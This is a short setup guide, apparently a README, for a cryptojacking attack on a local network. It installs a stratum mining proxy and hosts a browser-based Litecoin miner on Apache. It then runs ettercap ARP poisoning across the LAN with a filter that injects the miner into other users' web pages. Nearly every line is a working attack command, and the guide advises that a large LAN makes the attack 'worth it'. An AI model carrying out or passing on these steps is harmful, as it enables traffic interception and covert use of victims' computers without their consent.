Install some dependancies:
apt-get install python2.7 devscripts debhelper pbuilder python-twisted python-dev python-setuptools python-autobahn libapache2-mod-php5 php5-curl ettercap apache2

setup stratum-mining-proxy:

git clone https://github.com/slush0/stratum-mining-proxy
git clone https://github.com/slush0/stratum
cd stratum && ./setup.py develop
cd ..
cd stratum-mining-proxy && distribute_setup.py; chmod u+x setup.py; ./setup.py develop; mkdir log;
./mining_proxy.py -o ltc.ghash.io -p 3333 -sh 127.0.0.1 -oh 127.0.0.1  -cu up100454499.Web -cp yourpass -st -l log.txt
move lm to your apache directory.
cp lm /var/www/html -R
/etc/init.d/apache2 restart
etterfilter nethash.etterfilter -o nh.ef
ettercap -T -M arp:remote -q -F nh.ef /192.168.0.1/ //
CHANGE nethash.etterfilter file's ip in the perl script section to point to the webserver where you host the miner.

Test it by going to 127.0.0.1/lm

NOTE: You need a pretty large LAN for this to be worth it.  This mines with 4 cpu threads by default.
THANKS: Thanks to slush0, esenminer, and the ettercap team
